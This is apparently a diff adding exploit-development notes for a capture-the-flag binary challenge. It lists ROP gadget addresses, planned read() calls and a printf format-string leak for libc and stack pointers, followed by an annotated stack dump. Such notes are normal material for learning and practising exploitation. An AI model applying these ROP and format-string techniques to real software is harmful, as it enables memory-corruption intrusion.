@@ -1,0 +1,32 @@
+First ROP:
+0x0000000000400cf3 : pop rdi ; ret
+0x0000000000400cf1 : pop rsi ; pop r15 ; ret
+
+Make sure to start with 'ASIS{N0T_R34LLY_4_FL4G}'
+
+// no way to modify rdx (at least not until we leak libc)
+read(0, 0x6020F0, 0x8) 
+read(0, 0x6020F8, 0x8) 
+printf("%**$p%**$p") // use two leaks to leak stack and libc pointer
+
+/*
+
+
+0x7fffffffdf18: [0x3432393035383334]   0x3334393230353833
+0x7fffffffdf28:  0x3432383033323835    0x0000000a32353930
+0x7fffffffdf38:  0x0000000000400b57    0x0000000000000000
+0x7fffffffdf48:  0x469ddfe66c16b3d8    0x0000000000400940
+0x7fffffffdf58:  0x00007fffffffdff0    0x0000000000000000
+0x7fffffffdf68:  0x0000000000000000    0xb9622099cb76b3d8
+0x7fffffffdf78:  0xb962319b7ae6b3d8    0x0000000000000000
+0x7fffffffdf88:  0x0000000000000000    0x0000000000000000
+0x7fffffffdf98:  0x00007fffffffe008    0x00007ffff7ffe168 
+0x7fffffffdfa8: >0x00007ffff7de77cb<   0x0000000000000000
+0x7fffffffdfb8:  0x0000000000000000    0x0000000000400940
+0x7fffffffdfc8: >0x00007fffffffdff0<   0x0000000000000000
+0x7fffffffdfd8:  0x000000000040096a    0x00007fffffffdfe8
+0x7fffffffdfe8:  0x000000000000001c    0x0000000000000001
+0x7fffffffdff8:  0x00007fffffffe319    0x0000000000000000
+
+*/
+
